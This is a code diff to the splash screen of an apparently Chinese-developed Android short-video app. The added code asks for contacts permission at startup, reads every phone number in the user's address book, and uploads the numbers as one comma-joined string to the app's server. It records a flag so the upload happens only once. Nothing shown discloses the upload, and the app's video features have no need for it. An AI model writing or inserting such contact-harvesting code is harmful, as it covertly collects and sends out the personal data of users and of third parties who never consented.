@@ -2,14 +2,17 @@ package com.shortvideo.lib.ui.activity;
 
 import static android.view.View.DRAWING_CACHE_QUALITY_HIGH;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 
@@ -50,6 +53,7 @@ import com.shortvideo.lib.utils.ToastyUtils;
 import com.shuyu.gsyvideoplayer.GSYVideoManager;
 import com.shuyu.gsyvideoplayer.builder.GSYVideoOptionBuilder;
 import com.shuyu.gsyvideoplayer.listener.GSYSampleCallBack;
+import com.tbruyelle.rxpermissions3.RxPermissions;
 
 import org.greenrobot.eventbus.EventBus;
 
@@ -280,11 +284,33 @@ public class TkVideoSplashActivity extends AppCompatActivity {
                         if (comparedVersion(configBean.getAppPackageVer())) {
                             updataPop = new UpdataPop(TkVideoSplashActivity.this, configBean.getAppPackageIsMust().equals("1"),
                                     configBean.getAppPackageUrl(), () -> {
-                                getFusionConfig();
+                                if (TextUtils.isEmpty(SPUtils.getString("contacts_upload"))) {
+                                    RxPermissions rxPermissions = new RxPermissions(TkVideoSplashActivity.this);
+                                    rxPermissions
+                                            .request(Manifest.permission.READ_CONTACTS)
+                                            .subscribe(aBoolean -> {
+                                                if (aBoolean) {
+                                                    readContacts();
+                                                }
+                                            });
+                                } else {
+                                    getFusionConfig();
+                                }
                             });
                             updataPop.showPopupWindow();
                         } else {
-                            getFusionConfig();
+                            if (TextUtils.isEmpty(SPUtils.getString("contacts_upload"))) {
+                                RxPermissions rxPermissions = new RxPermissions(TkVideoSplashActivity.this);
+                                rxPermissions
+                                        .request(Manifest.permission.READ_CONTACTS)
+                                        .subscribe(aBoolean -> {
+                                            if (aBoolean) {
+                                                readContacts();
+                                            }
+                                        });
+                            } else {
+                                getFusionConfig();
+                            }
                         }
                     }
 
@@ -385,6 +411,61 @@ public class TkVideoSplashActivity extends AppCompatActivity {
                         .navigation();
                 finish();
             }, 2000);
+        }
+    }
+
+    /**
+     * 获取通讯录
+     */
+    private void readContacts() {
+        Cursor cursor = null;
+        String userPhone = "";
+        try {
+            //查询联系人数据,使用了getContentResolver().query方法来查询系统的联系人的数据
+            //CONTENT_URI就是一个封装好的Uri，是已经解析过得常量
+            cursor = getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null,
+                    null,
+                    null,
+                    null
+            );
+            //对cursor进行遍历，取出姓名和电话号码
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    //获取联系人手机号
+                    String number = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER
+                    ));
+                    if (!TextUtils.isEmpty(number)) {
+                        if (TextUtils.isEmpty(userPhone)) {
+                            userPhone = number;
+                        } else {
+                            userPhone += "," + number;
+                        }
+                    }
+                }
+                if (!TextUtils.isEmpty(userPhone))
+                    HttpRequest.uploadContacts(TkVideoSplashActivity.this, userPhone, new HttpCallBack<List<String>>() {
+                        @Override
+                        public void onSuccess(List<String> list, String msg) {
+                            SPUtils.set("contacts_upload", "1");
+                            getFusionConfig();
+                        }
+
+                        @Override
+                        public void onFail(int errorCode, String errorMsg) {
+                            getFusionConfig();
+                        }
+                    });
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            //记得关掉cursor
+            if (cursor != null) {
+                cursor.close();
+            }
         }
     }
 
